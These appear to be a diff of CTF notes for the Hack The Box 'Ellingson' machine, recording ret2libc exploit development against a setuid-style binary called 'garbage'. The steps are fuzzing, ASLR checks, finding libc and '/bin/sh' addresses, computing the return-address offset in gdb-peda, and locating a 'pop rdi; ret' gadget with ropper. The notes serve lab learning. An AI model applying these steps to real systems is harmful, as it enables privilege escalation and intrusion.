@@ -1,0 +1,63 @@
+python -c 'print "A"*500'
+
+ASLR is enabled
+
+margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
+2
+
+
+
+
+Find address of /bin/sh in libc
+
+margo@ellingson:~$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+ 1b3e9a /bin/sh
+margo@ellingson:~$ 
+
+Find address of libc
+
+margo@ellingson:~$ ldd /usr/bin/garbage
+	linux-vdso.so.1 (0x00007fff513fe000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fafec1ea000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fafec5db000)
+margo@ellingson:~$ 
+
+
+
+
+root@kali:~/HTB/Ellingson# gdb garbage
+gdb-peda$ pattern_create 400
+gdb-peda$ run < pattern.txt
+gdb-peda$ x/wx $rsp
+0x7fffc455f758:	0x41514141
+gdb-peda$ pattern_offset 0x41514141
+1095844161 found at offset: 136
+
+Overwrite return address at 144 (since the register is 8 bytes)
+
+
+
+gdb-peda$ run < exit.txt
+..Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000004016 in ?? ()
+gdb-peda$ p system
+$1 = {int (const char *)} 0x7f02fe0dcbf0 <__libc_system>
+gdb-peda$ searchmem /bin/sh
+Searching for '/bin/sh' in: None ranges
+Found 2 results, display max 2 items:
+[heap] : 0xf0d13e ("/bin/sh\nDebian-snmp:x:117:122::/var/lib/snmp:/bin/false\nstunnel4:x:118:123::/var/run/stunnel4:/usr/sbin/nologin\nrtkit:x:119:124:RealtimeKit,,,:/proc:/usr/sbin/nologin\nsslh:x:120:126::/nonexistent:/usr"...)
+  libc : 0x7f02fe219519 --> 0x68732f6e69622f ('/bin/sh')
+
+
+
+root@kali:~/HTB/Ellingson# python3 -m ropper --file garbage --search "pop rdi; ret;"
+[INFO] Load gadgets for section: LOAD
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdi; ret;
+
+[INFO] File: garbage
+0x000000000040179b: pop rdi; ret; 
+
+
